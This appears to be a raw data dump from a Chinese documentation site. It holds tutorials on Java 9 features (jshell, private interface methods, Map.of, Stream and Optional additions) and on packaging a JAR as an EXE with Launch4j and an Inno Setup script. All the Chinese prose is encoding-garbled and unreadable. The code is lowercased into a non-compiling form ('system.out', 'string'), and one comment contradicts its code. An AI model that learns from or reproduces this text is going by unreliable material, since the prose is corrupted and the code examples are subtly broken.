è¯­å¥ä½¿ç¨æå¡æ¥å£çåå­ï¼å½åæ¨¡åå°±ä¼åç°å®ï¼ä½¿ç¨ java.util.serviceloader ç±»è¿è¡å è½½ï¼å¿é¡»æ¯æ¬æ¨¡åä¸­çï¼ä¸è½æ¯å¶ä»æ¨¡åä¸­çãå¶å®ç°ç±»å¯ä»¥ç±å¶ä»æ¨¡åæä¾.\n\n\n\n\n\n\n# jshell äº¤äºå¼ç¼ç¨\n\njava9 ä¸ºæä»¬æä¾äºä¸ç§äº¤äºå¼åæå·¥å· jshellï¼ä½ è¿å«è¯´ï¼çæ python çå³é\n\nc:\\users\\user>jshell\n|  æ¬¢è¿ä½¿ç¨ jshell -- çæ¬ 17.0.3.1\n|  è¦å¤§è´äºè§£è¯¥çæ¬, è¯·é®å¥: /help intro\n\njshell>\n\n\n1\n2\n3\n4\n5\n\n\nç¯å¢éç½®å®æåï¼æä»¬åªéè¦è¾å¥ jshell å½ä»¤å³å¯å¼å¯äº¤äºå¼ç¼ç¨äºï¼å®æ¯ææä»¬ä¸æ¡ä¸æ¡å½ä»¤è¿è¡æä½ãæ¯å¦æä»¬æ¥åä¸ä¸ªç®åçè®¡ç®ï¼\n\njshell> int a = 10\na ==> 10\n\njshell> int b = 10\nb ==> 10\n\njshell> int c = a/b\nc ==> 1\n\njshell>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nä½¿ç¨ /vars å¯ä»¥çå°æä»¬å®ä¹çææåé\n\njshell> /vars\n|    int a = 10\n|    int b = 10\n|    int c = 1\n\n\n1\n2\n3\n4\n\n\næä»¬ä¹å¯ä»¥åä¸ä¸ªæ¹æ³ï¼å¹¶éè¿ /method æ¹æ³ååºæææ¹æ³ï¼å¹¶è°ç¨æ¹æ³\n\njshell> public int max(int a,int b){\n   ...>     return a > b? a: b;\n   ...> }\n|  å·²åå»º æ¹æ³ max(int,int)\n\njshell> /method\n|    int max(int,int)\n\njshell> max(19,20)\n$5 ==> 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æ¥å£ä¸­ç private æ¹æ³\n\nå¨ java8 ä¸­ï¼æ¥å£ä¸­çæ¹æ³æ¯ææ·»å  default å³é®å­æ¥æ·»å é»è®¤å®ç°ï¼èå¨ java9 ä¸­ï¼æ¥å£åæ¬¡å¾å°å¼ºåï¼æä¾æ¥å£ä¸­å¯ä»¥å­å¨ç§ææ¹æ³ã\n\npackage com.b;\n\npublic interface test {\n\n    default void test(){\n        this.test1();\n        system.out.println("é»è®¤æ¹æ³");\n    }\n\n    private void test1(){\n        system.out.println("ç§ææ¹æ³");\n    }\n\n    static void test2(){\n        system.out.println("éææ¹æ³");\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\npackage com.b;\n\npublic class mainb implements test {\n\n    public static void main(string[] args){\n        mainb mainb = new mainb();\n        mainb.test();\n        test.test2();\n    }\n\n}\n\nç§ææ¹æ³\né»è®¤æ¹æ³\néææ¹æ³\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# éåç±»æ°å¢å·¥åæ¹æ³\n\nå¨ä¹åï¼å¦ææä»¬æ³è¦å¿«éåå»ºä¸ä¸ª map å¯ä»¥éè¿ä»¥ä¸æ¹å¼\n\n    public static void main(string[] args){\n        map<string,string> map = new hashmap(3);\n        map.put("key","value");\n        \n        map = new hashmap<string,string>(3){{\n            put("key","value");\n        }};    \n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨ java9 ä¹åï¼æä»¬å¯ä»¥ç´æ¥éè¿ of æ¹æ³æ¥å¿«éåå»ºï¼ä½æ¯è¿ç§æ¹å¼å°±ä¸è½ä½¿ç¨ put æ¹æ³\n\nmap<string, string> key = map.of("key", "value");\n\n\n1\n\n\n\n# æ¹è¿ç stream api\n\n    public static void main(string[] args){\n        // java8 åªè½ä½¿ç¨ofï¼ä¸ºnullä¼æ¥é\n        stream.of(null).foreach(system.out::println);\n\n        // java9 åè®¸ä¸ºnull\n        stream.ofnullable(null).foreach(system.out::println);\n\n        // java8 åè®¸çææ éçæ°æ®ï¼å¯ä»¥ç¨limitéå¶\n        stream.iterate(0,i -> i+1).limit(20).foreach(system.out::println);\n\n        // java9 åä¸ºä½¿ç¨è¡¨è¾¾å¼æ¥éå¶ ç¸å½äº for (int i=0;i<20;i++)\n        stream.iterate(0,i -> i < 20,i -> i + 1).foreach(system.out::println);\n\n        // java9 è¿å¢å äºæªæ­æµ, i < 10ï¼çæ å°äº 10 çæ°æ®\n        stream.iterate(0,i -> i < 20,i -> i + 1).takewhile(i -> i>10).foreach(system.out::println);\n\n        // java9 è¿å¢å äºå é¤æµ, i < 10ï¼å°äº 10 çæ°æ®é½è¢«å æï¼ç¸å½äºå¼æå° i >= 10 çæ°æ®\n        stream.iterate(0,i -> i < 20,i -> i + 1).dropwhile(i -> i>10).foreach(system.out::println);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¶ä»å°æ¹å¨\n\njava7 æ°å¢äº try-with-resourcesï¼åªæå®ç°äº autocloseable æ closeable æ¥å£çèµæºï¼ï¼java9 æå¯¹ try å¢å¼º\n\npublic void java8(){\n        try (inputstream stream = files.newinputstream(paths.get("pom.xml"))){\n                stream....\n        }catch(exception e){\n            e.printstacktrace();\n        }\n    }\n\n    public void java9() throws ioexception {\n        inputstream stream = files.newinputstream(paths.get("pom.xml"));\n        try (stream){\n            for (int i = 0; i < 100; i++) {\n                system.out.println(stream.read());\n            }\n        }catch(exception e){\n            e.printstacktrace();\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\noptional å¢å¼º\n\n    public void java8(){\n        string s = null;\n        optional.ofnullable(s).ifpresent(str -> system.out.println("str = " + str));\n    }\n\n    public void java9() throws ioexception {\n        string s = null;\n        // ç±»ä¼¼äº if else\n        optional.ofnullable(s)\n                .ifpresentorelse(str -> system.out.println("str = " + str),() -> system.out.println("mainb.java9"));\n    }\n\n    public void java9_1()  {\n        string s = null;\n        // ç±»ä¼¼äº if else\n        optional.ofnullable(s)\n                .ifpresentorelse(str -> system.out.println("str = " + str),() -> system.out.println("mainb.java9"));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',charsets:{cjk:!0}},{title:"jar æåæ.exeå¯æ§è¡æä»¶",frontmatter:{title:"jar æåæ.exeå¯æ§è¡æä»¶",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/1.%E6%89%93%E5%8C%85exe%E7%A8%8B%E5%BA%8F.html",relativePath:"00.è¯­è¨/01.JAVA/04.å¶ä»/1.æåexeç¨åº.md",key:"v-71786ef2",path:"/language/java/other/1/",headers:[{level:2,title:"ä½¿ç¨ Launch4j",slug:"ä½¿ç¨-launch4j",normalizedTitle:"ä½¿ç¨ launch4j",charIndex:33},{level:3,title:"Basic",slug:"basic",normalizedTitle:"basic",charIndex:1575},{level:3,title:"JRE",slug:"jre",normalizedTitle:"jre",charIndex:697},{level:3,title:"console",slug:"console",normalizedTitle:"console",charIndex:1777},{level:2,title:"ä½¿ç¨ Inno Setup",slug:"ä½¿ç¨-inno-setup",normalizedTitle:"ä½¿ç¨ inno setup",charIndex:1802},{level:3,title:"Setup",slug:"setup",normalizedTitle:"setup",charIndex:52},{level:3,title:"Dirs",slug:"dirs",normalizedTitle:"dirs",charIndex:2243},{level:3,title:"Files",slug:"files",normalizedTitle:"files",charIndex:2006},{level:3,title:"Registry",slug:"registry",normalizedTitle:"registry",charIndex:2430},{level:3,title:"Run",slug:"run",normalizedTitle:"run",charIndex:2608}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä½¿ç¨ Launch4j Basic JRE console ä½¿ç¨ Inno Setup Setup Dirs Files Registry Run",content:'è¦å°ä¸ä¸ª Java JAR æä»¶æåæå¯æ§è¡ç EXE æä»¶ï¼å¯ä»¥ä½¿ç¨ Launch4j å Inno Setup æ¥å®æè¿ä¸ªä»»å¡ã\n\nLaunch4j ç¨äºå° Java åºç¨ç¨åºæåä¸ºæ¬æºå¯æ§è¡æä»¶ï¼éå¸¸ä¸º EXE æä»¶ï¼çå·¥å·ãå®çä¸»è¦ä½ç¨æ¯åå»ºä¸ä¸ªåè£å¨ï¼åè®¸ç¨æ·åè¿è¡æ¬æº Windows åºç¨ç¨åºä¸æ ·è¿è¡ Java åºç¨ç¨åºï¼èæ éæå¨å¯å¨ Java èææºï¼JVMï¼ã Launch4j æ¯ä¸ä¸ªåè´¹çå¼æºé¡¹ç®ï¼å®éµå¾ª GNU General Public Licenseï¼GPLï¼è®¸å¯è¯ãè¿æå³çä½ å¯ä»¥åè´¹ä½¿ç¨ Launch4j æ¥åå»ºå¯æ§è¡æä»¶ï¼åæ¬åä¸ç¨éãä½ å¯ä»¥ä» Launch4j çå®æ¹ç½ç«ä¸è½½å¹¶ä½¿ç¨å®ï¼æ éæ¯ä»è®¸å¯è´¹ç¨ãå®ç½å°å\n\nLaunch4j åè½æï¼\n\n * åå»ºæ¬æºå¯æ§è¡æä»¶ï¼Launch4j åè®¸ä½ å°ä½ ç Java åºç¨ç¨åºæåä¸ºä¸ä¸ªæ¬æºçå¯æ§è¡æä»¶ï¼éå¸¸æ¯ EXE æä»¶ï¼ãè¿æå³çç¨æ·å¯ä»¥åå»è¯¥æä»¶æ¥è¿è¡ä½ ç Java åºç¨ç¨åºï¼èæ éæå¨æå¼å½ä»¤è¡æ JVMã\n * èªå®ä¹å¯æ§è¡æä»¶å±æ§ï¼ä½ å¯ä»¥éè¿ Launch4j éç½®å¯æ§è¡æä»¶çåç§å±æ§ï¼å¦ç¨åºå¾æ ãæä»¶çæ¬ä¿¡æ¯ãæ é¢ç­ãè¿æå©äºä½¿ä½ ç Java åºç¨ç¨åºçèµ·æ¥åæ¬æº Windows åºç¨ç¨åºã\n * æ¯æç±»è·¯å¾å JAR æä»¶ï¼Launch4j åè®¸ä½ æå®åºç¨ç¨åºçç±»è·¯å¾åå³èç JAR æä»¶ï¼ä»¥ç¡®ä¿ä½ ç Java åºç¨ç¨åºè½å¤æ­£å¸¸è¿è¡ã\n * èªå¨æ£æµ Main-Classï¼å®å¯ä»¥èªå¨æ£æµä½ ç JAR æä»¶ä¸­ç Main-Classï¼ä»èæ éæå¨æå®åºç¨ç¨åºçå¥å£ç¹ã\n * æ¯æ JRE éé¡¹ï¼ä½ å¯ä»¥éæ©å° JREï¼Java è¿è¡æ¶ç¯å¢ï¼æåå°çæçå¯æ§è¡æä»¶ä¸­ï¼ä»èç¨æ·æ éå®è£ JRE å³å¯è¿è¡ä½ çåºç¨ç¨åºã\n * è·¨å¹³å°å¼å®¹æ§ï¼çæçå¯æ§è¡æä»¶éå¸¸åªè½å¨ Windows ä¸è¿è¡ï¼ä½ Launch4j å¯ä»¥å¨ Windows ä¸åå»ºç¨äºå¶ä»å¹³å°çåè£å¨ï¼ä¾å¦ Linux æ macOSã\n\nInno Setup æ¬èº«ä¸è½ç´æ¥å° JAR æä»¶æåæ EXE æä»¶ãæä»¥æä»¬è¦åä½¿ç¨ Launch4j æ jar æåæä¸ä¸ª exe æ ¼å¼çå¯æ§è¡ç¨åºãInno Setup æ¯ä¸ä¸ªåè´¹çå¼æºå®è£å¶ä½å·¥å·ï¼å®éµå¾ªè®¸å¯è¯åè®¸åè´¹ä½¿ç¨ï¼åæ¬åä¸ç¨éãInno Setup çä¸»è¦ä½ç¨æ¯åå»ºç¨äºå®è£åå¸è½½ Windows åºç¨ç¨åºçå®è£ç¨åºãå®ç½å°å\n\nInno Setup åè½æï¼\n\n * åå»ºèªå®ä¹å®è£ç¨åºï¼Inno Setup åè®¸å¼åäººååå»ºå®å¶çãæäºä½¿ç¨çå®è£ç¨åºï¼ç¨äºå°ä»ä»¬çåºç¨ç¨åºé¨ç½²å° Windows æä½ç³»ç»ä¸ãä½ å¯ä»¥å®ä¹å®è£è¿ç¨çåä¸ªæ¹é¢ï¼åæ¬æä»¶å¤å¶ãæ³¨åè¡¨é¡¹ãå¿«æ·æ¹å¼ãå¼å§èåé¡¹ç­ã\n * æ¯æå¤ç§å®è£ä»»å¡ï¼Inno Setup æ¯æåç§åæ ·çå®è£ä»»å¡ï¼åæ¬ç®åçæä»¶å¤å¶ï¼æ³¨åè¡¨è®¾ç½®ï¼åå»ºå¿«æ·æ¹å¼ï¼ä»¥åæ§è¡èªå®ä¹èæ¬åä»»å¡ãè¿ä½¿å¾ä½ å¯ä»¥è½»æ¾å°èªå®ä¹å®è£è¿ç¨ï¼ä»¥æ»¡è¶³ä½ çåºç¨ç¨åºçç¹å®éæ±ã\n * èæ¬åï¼Inno Setup ä½¿ç¨åºäºèæ¬çè¯­è¨æ¥å®ä¹å®è£è¿ç¨ãè¿æå³çä½ å¯ä»¥ç¼åèæ¬æ¥æè¿°å®è£ç¨åºçè¡ä¸ºï¼ä½¿å¶éå¸¸çµæ´»ãInno Setup ä½¿ç¨ç±»ä¼¼äº Pascal çèæ¬è¯­è¨ã\n * å¤è¯­è¨æ¯æï¼Inno Setup æ¯æå¤ç§è¯­è¨ï¼åè®¸ä½ ä¸ºä¸åçç¨æ·ç¾¤ä½åå»ºå¤è¯­è¨å®è£ç¨åºï¼ä»¥æä¾æ¬å°åçå®è£åå¸è½½ä½éªã\n * å¸è½½æ¯æï¼Inno Setup ä¸ä»å¯ä»¥åå»ºå®è£ç¨åºï¼è¿å¯ä»¥çæå¸è½½ç¨åºï¼åè®¸ç¨æ·ä»ä»ä»¬çè®¡ç®æºä¸å¸è½½ä½ çåºç¨ç¨åºã\n\n\n# ä½¿ç¨ Launch4j\n\nLaunch4j æ jar åè£æ .exe ç¨åºè¿æ¯ææå±éçï¼æ¯å¦å¯å¨æ¹å¼åªè½æ¯ java -jarï¼å¦æéåæ··æ·å°±æ²¡æåæ³\n\n\n# Basic\n\nå¨è¿ééç½®è·¯å¾ç­ä¿¡æ¯\n\n\n\nOutput file: å¡«åæ jar ææ.exe ç¨åºçè¾åºè·¯å¾\njarï¼éæ©èªå·±è¦æåç jar\n\n\n# JRE\n\nå¨è¿ééç½® JVMï¼JDK çæ¬ç­ä¿¡æ¯\n\n\n\nJRE pathsï¼ä¸éè¦æä»¬å¡«\nMin JRE versionï¼æä½ JDK çæ¬\nMax JRE versionï¼æé« JDK çæ¬\nJVM optionï¼è®¾ç½® JVM å¯å¨åæ°\n\n\n# console\n\nè®¾ç½® console\n\n\n\n# ä½¿ç¨ Inno Setup\n\nInno Setup è¿æ¯æäºé¾åº¦çï¼éè¦å­¦ä¹ éé¢çåä¸ªå³é®å­ï¼åè°ï¼äºä»¶ç­ï¼æè½ææ¡ Inno Setup çä½¿ç¨\n\nä»¥ä¸è´´ä¸ä¸ªç®åç Inno Setup ç¤ºä¾\n\n;éç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸º\n[Setup]\n; åºç¨åç§°\nAppName=Easy-Manager-Tool\n; åºç¨çæ¬\nAppVersion=1.0\n; é»è®¤å®è£ç®å½ {pf}ä¸º Program Files è¿ä¸ªè·¯å¾æ¯ç±»ä¼¼äº C:\\Program Files çå½¢å¼\nDefaultDirName={pf}\\emt\n; åºç¨è¾åºå°æä»¶è·¯å¾\nOutputDir=C:\\Users\\User\\Desktop\\tool\\gen\n; è¾åºæä»¶çåç§°\nOutputBaseFilename=emt\n; æå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°\nAppPublisher=\n; åºç¨ç¨åºåå¸èçç½ç«æURL\nAppPublisherURL=\n\n; åå»ºç®å½ {app} å½è¡¨åºç¨æå¨çè·¯å¾\n[Dirs]\nName: "{app}\\go"; Permissions: everyone-full\n\n; æ·»å æä»¶\n[Files]\nSource: "C:\\Users\\User\\Desktop\\build\\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs\n\n; æ³¨åè¡¨\n[Registry]\nRoot: HKLM; Subkey: "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"; ValueType: string; ValueName: "Path"; ValueData: "{olddata};{app}\\jdk\\bin"\n\n; è¿è¡èæ¬\n[Run]\nFilename: "{sys}\\cmd.exe"; Parameters: "/C setx PATH ""{app}\\go\\bin;%PATH%"""; Flags: runasoriginaluser; StatusMsg: "Setting PATH for Go..."; Check: not Is64BitInstallMode\nFilename: "{app}\\runBuild.bat"; Description: "runBuild.bat";\nFilename: "cmd.exe"; Parameters: "/c setx PATH ""%PATH%;{app}\\jdk\\bin"" /m"; Flags: runhidden; WorkingDir: {app}; StatusMsg: "Updating PATH environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Setup\n\nç¨äºéç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸ºãå¨ [Setup] é¨åä¸­ï¼ä½ å¯ä»¥æå®åç§å®è£ç¨åºçå±æ§ï¼ä¾å¦åºç¨ç¨åºåç§°ãçæ¬å·ãå®è£ç®å½ãè¾åºç®å½ç­ãä»¥ä¸æ¯ [Setup] å¯ä»¥æè¿°çä¸äºéè¦åå®¹ï¼\n\n * AppNameï¼è¿ä¸ªéé¡¹ç¨äºæå®å®è£ç¨åºçåºç¨ç¨åºåç§°ãå®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºç»ç¨æ·ï¼éå¸¸ç¨äºå¨å¼å§èåãå¸è½½é¡¹ç­ä½ç½®æ¾ç¤ºåºç¨ç¨åºçåç§°ã\n * AppVersionï¼ç¨äºå®ä¹å®è£ç¨åºççæ¬å·ãè¿å¯ä»¥æ¯ä½ çåºç¨ç¨åºçå®éçæ¬å·ï¼ä»¥å¸®å©ç¨æ·äºè§£å®è£çåå®¹ã\n * DefaultDirNameï¼æå®é»è®¤çå®è£ç®å½ãå¯ä»¥ä½¿ç¨é¢å®ä¹çå¸¸éï¼å¦ {pf} ä»£è¡¨ Program Files ç®å½ï¼ï¼æèæå®ä¸ä¸ªå·ä½çè·¯å¾ã\n * OutputDirï¼å®ä¹çæå®è£ç¨åºçè¾åºç®å½ãè¿æ¯æå®çæçå®è£æä»¶ï¼éå¸¸æ¯ .exe æä»¶ï¼å°è¢«ä¿å­çä½ç½®ã\n * OutputBaseFilenameï¼æå®çæçå®è£ç¨åºçæä»¶åï¼éå¸¸æ¯ä¸ä¸ª .exe æä»¶ãè¿å°æ¯ç¨æ·è¿è¡çå®éå®è£ç¨åºæä»¶çåç§°ã\n * AppPublisherï¼ç¨äºæå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°ï¼å®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * AppPublisherURLï¼å¯ç¨äºæä¾åºç¨ç¨åºåå¸èçç½ç«æ URLï¼è¿ä¹å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * AppSupportURLï¼å¯ä»¥åå«æ¯ææå¸®å©ä¿¡æ¯ç URLã\n * AppUpdatesURLï¼å¦ææå³äºåºç¨ç¨åºæ´æ°çä¿¡æ¯æ URLï¼å¯ä»¥å¨è¿éæå®ã\n * AppMutexï¼ç¨äºæå®åºç¨ç¨åºçäºæ¥ä½åç§°ï¼ä»¥ç¡®ä¿å¨å®è£è¿ç¨ä¸­åªè½è¿è¡ä¸ä¸ªå®ä¾ã\n * DefaultGroupNameï¼å®ä¹å¼å§èåä¸­åºç¨ç¨åºå¿«æ·æ¹å¼çé»è®¤ç»åã\n * AllowUNCPathï¼æå®æ¯å¦åè®¸å®è£å° UNC è·¯å¾ï¼ç½ç»å±äº«è·¯å¾ï¼ã\n * UninstallDisplayIconï¼å®ä¹å¸è½½ç¨åºçæ¾ç¤ºå¾æ ã\n * UninstallDisplayNameï¼æå®å¸è½½ç¨åºçæ¾ç¤ºåç§°ã\n * UninstallStringï¼å®ä¹å¸è½½ç¨åºçæ§è¡å½ä»¤ã\n\n\n# Dirs\n\nç¨äºå®ä¹å¨ç¨æ·è®¡ç®æºä¸åå»ºçç®å½ç»æãéè¿ [Dirs] é¨åï¼ä½ å¯ä»¥æå®è¦å¨ç®æ è®¡ç®æºä¸åå»ºçç®å½ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­å°æä»¶å¤å¶å°è¿äºç®å½ä¸­ãä»¥ä¸æ¯ [Dirs] å¯ä»¥æè¿°çåå®¹ï¼\n\n 1. ç®å½åç§°ï¼å¨ [Dirs] é¨åä¸­ï¼ä½ å¯ä»¥ååºè¦åå»ºçç®å½çåç§°ãè¿äºç®å½åç§°éå¸¸æ¯ç¸å¯¹äºå®è£ç®å½ï¼ç± [Setup] é¨åç DefaultDirName æå®ï¼çç¸å¯¹è·¯å¾ã\n 2. Permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªç®å½æå®æéï¼ä¾å¦è¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·æ¯å¦å¯ä»¥è®¿é®æä¿®æ¹è¿äºç®å½ä¸­çæä»¶ã\n 3. Subdirectoriesï¼ä½ å¯ä»¥å®ä¹å­ç®å½ï¼ä»¥ä¾¿å¨ç®å½åå»ºæ¶åæ¶åå»ºå­ç®å½ãè¿æå©äºæå»ºå¤æçç®å½ç»æ\n\n\n# Files\n\nç¨äºæå®è¦å¨å®è£è¿ç¨ä¸­åå«çæä»¶åå®ä»¬çå®è£ç®æ ãéè¿ [Files] é¨åï¼ä½ å¯ä»¥å®ä¹è¦å¤å¶å°ç®æ è®¡ç®æºä¸çæä»¶ãæä»¶çæºè·¯å¾åæä»¶çç®æ è·¯å¾ï¼ä»¥åå¶ä»æä»¶ç¸å³çå±æ§ãä»¥ä¸æ¯ [Files] å¯ä»¥æè¿°çåå®¹ï¼\n\n * Sourceï¼è¿ä¸ªå­æ®µæå®äºè¦å¤å¶çæä»¶çæºè·¯å¾ãä½ å¯ä»¥æå®å®æ´çæä»¶è·¯å¾ï¼ä¹å¯ä»¥ä½¿ç¨ééç¬¦æ¥åæ¬å¤ä¸ªæä»¶ã\n * DestDirï¼ç¨äºæå®æä»¶çç®æ ç®å½ãè¿æ¯æä»¶å¨ç¨æ·è®¡ç®æºä¸çæç»å®è£ä½ç½®ã\n * DestNameï¼æå®æä»¶å¨ç®æ è®¡ç®æºä¸çåç§°ãè¿å¯ä»¥æ¯ä¸æºæä»¶ä¸åçåç§°ã\n * Checkï¼è¿ä¸ªå­æ®µåè®¸ä½ å®ä¹æä»¶çæ£æ¥æ¹æ³ï¼ä»¥ç¡®ä¿æä»¶å¨å¤å¶å°ç®æ è®¡ç®æºä¸æ¶æ²¡æè¢«æ´æ¹ææåã\n * Permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªæä»¶å®ä¹æéï¼åæ¬æä»¶çè¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·å¯¹æä»¶çè®¿é®æéã\n * Attribsï¼åè®¸ä½ ä¸ºæä»¶å®ä¹å±æ§ï¼å¦åªè¯»ãéèç­ã\n * FontInstallï¼å¦æä½ çå®è£ç¨åºåå«å­ä½æä»¶ï¼ä½ å¯ä»¥ä½¿ç¨è¿ä¸ªå­æ®µæ¥å®è£å­ä½æä»¶å¹¶æ³¨åå®ä»¬ã\n * Flagsï¼ç¨äºæå®ä¸æä»¶ç¸å³çç¹å®æ å¿ï¼ä¾å¦åå»ºå¿«æ·æ¹å¼ã\n\n\n# Registry\n\nç¨äºå¨ Windows æ³¨åè¡¨ä¸­åå»ºãä¿®æ¹æå é¤é®åå¼ãéè¿ [Registry] é¨åï¼ä½ å¯ä»¥éç½®ä½ çå®è£ç¨åºå¨ç¨æ·è®¡ç®æºä¸åå»ºæ³¨åè¡¨é¡¹ï¼ä»¥å­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ãå³èæä»¶æ©å±ãæä»¶å³èç­ç­ãä»¥ä¸æ¯ [Registry] å¯ä»¥æè¿°çåå®¹ï¼\n\n * Rootï¼æå®æ³¨åè¡¨é¡¹çæ ¹é®ï¼éå¸¸æ¯ HKEY_LOCAL_MACHINE æ HKEY_CURRENT_USERãä¸åçæ ¹é®å¯¹åºä¸åçé¨åï¼ä¾å¦ HKEY_LOCAL_MACHINE ç¨äºç³»ç»èå´çè®¾ç½®ï¼è HKEY_CURRENT_USER ç¨äºå½åç¨æ·çè®¾ç½®ã\n * Subkeyï¼æå®æ³¨åè¡¨é¡¹çå­é®è·¯å¾ãè¿æ¯æ³¨åè¡¨ä¸­çç®æ ä½ç½®ã\n * ValueNameï¼å®ä¹æ³¨åè¡¨å¼çåç§°ãè¿å¯ä»¥æ¯ä¸ä¸ªå­ç¬¦ä¸²ï¼éå¸¸ç¨äºå­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ã\n * ValueTypeï¼æå®æ³¨åè¡¨å¼çç±»åï¼å¦å­ç¬¦ä¸²ãæ´æ°ç­ã\n * ValueDataï¼å®ä¹æ³¨åè¡¨å¼çæ°æ®ãè¿æ¯å®éçå¼ï¼å¯ä»¥æ¯ææ¬ãæ°å­ç­ã\n * Flagsï¼ç¨äºæå®æ³¨åè¡¨é¡¹åå¼çå±æ§ï¼ä¾å¦åå»ºãå é¤ãè¦çç­ã\n * Permissionsï¼ä½ å¯ä»¥å®ä¹æ³¨åè¡¨é¡¹çæéï¼ä»¥ç¡®ä¿åªæå·æéå½æéçç¨æ·æè½è®¿é®æä¿®æ¹æ³¨åè¡¨é¡¹ã\n\n\n# Run\n\nç¨äºå¨å®è£è¿ç¨ä¸­æå®è¦è¿è¡çå¯æ§è¡æä»¶ãèæ¬æå¶ä»ç¨åºãéè¿ [Run] é¨åï¼ä½ å¯ä»¥éç½®å®è£ç¨åºå¨å®è£å®æåæå¸è½½ç¨åºæ¶æ§è¡çæä½ãä»¥ä¸æ¯ [Run] å¯ä»¥æè¿°çåå®¹ï¼\n\n * Filenameï¼æå®è¦è¿è¡çæä»¶çè·¯å¾ï¼è¿å¯ä»¥æ¯ä¸ä¸ªå¯æ§è¡æä»¶ï¼.exeï¼ãèæ¬ï¼.batã.cmdã.vbs ç­ï¼æå¶ä»ç¨åºã\n * Parametersï¼å®ä¹è¦ä¼ éç»è¿è¡æä»¶çåæ°æå½ä»¤è¡åæ°ãè¿åè®¸ä½ åè¿è¡çç¨åºä¼ éé¢å¤çä¿¡æ¯ã\n * WorkingDirï¼æå®è¿è¡æä»¶æ¶çå·¥ä½ç®å½ãè¿æ¯è¿è¡æä»¶æå¨çç®å½ã\n * Descriptionï¼æä¾ä¸ä¸ªå¯éçæè¿°ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­æ¾ç¤ºæè®°å½æ­¤æä½ã\n * Flagsï¼ç¨äºæå®è¿è¡æä½çæ å¿ï¼ä¾å¦æ¯å¦ç­å¾è¿è¡çç¨åºå®æã\n * StatusMsgï¼å®ä¹å¨æ§è¡æ­¤æä½æ¶è¦æ¾ç¤ºç»ç¨æ·çç¶ææ¶æ¯ã',normalizedContent:'è¦å°ä¸ä¸ª java jar æä»¶æåæå¯æ§è¡ç exe æä»¶ï¼å¯ä»¥ä½¿ç¨ launch4j å inno setup æ¥å®æè¿ä¸ªä»»å¡ã\n\nlaunch4j ç¨äºå° java åºç¨ç¨åºæåä¸ºæ¬æºå¯æ§è¡æä»¶ï¼éå¸¸ä¸º exe æä»¶ï¼çå·¥å·ãå®çä¸»è¦ä½ç¨æ¯åå»ºä¸ä¸ªåè£å¨ï¼åè®¸ç¨æ·åè¿è¡æ¬æº windows åºç¨ç¨åºä¸æ ·è¿è¡ java åºç¨ç¨åºï¼èæ éæå¨å¯å¨ java èææºï¼jvmï¼ã launch4j æ¯ä¸ä¸ªåè´¹çå¼æºé¡¹ç®ï¼å®éµå¾ª gnu general public licenseï¼gplï¼è®¸å¯è¯ãè¿æå³çä½ å¯ä»¥åè´¹ä½¿ç¨ launch4j æ¥åå»ºå¯æ§è¡æä»¶ï¼åæ¬åä¸ç¨éãä½ å¯ä»¥ä» launch4j çå®æ¹ç½ç«ä¸è½½å¹¶ä½¿ç¨å®ï¼æ éæ¯ä»è®¸å¯è´¹ç¨ãå®ç½å°å\n\nlaunch4j åè½æï¼\n\n * åå»ºæ¬æºå¯æ§è¡æä»¶ï¼launch4j åè®¸ä½ å°ä½ ç java åºç¨ç¨åºæåä¸ºä¸ä¸ªæ¬æºçå¯æ§è¡æä»¶ï¼éå¸¸æ¯ exe æä»¶ï¼ãè¿æå³çç¨æ·å¯ä»¥åå»è¯¥æä»¶æ¥è¿è¡ä½ ç java åºç¨ç¨åºï¼èæ éæå¨æå¼å½ä»¤è¡æ jvmã\n * èªå®ä¹å¯æ§è¡æä»¶å±æ§ï¼ä½ å¯ä»¥éè¿ launch4j éç½®å¯æ§è¡æä»¶çåç§å±æ§ï¼å¦ç¨åºå¾æ ãæä»¶çæ¬ä¿¡æ¯ãæ é¢ç­ãè¿æå©äºä½¿ä½ ç java åºç¨ç¨åºçèµ·æ¥åæ¬æº windows åºç¨ç¨åºã\n * æ¯æç±»è·¯å¾å jar æä»¶ï¼launch4j åè®¸ä½ 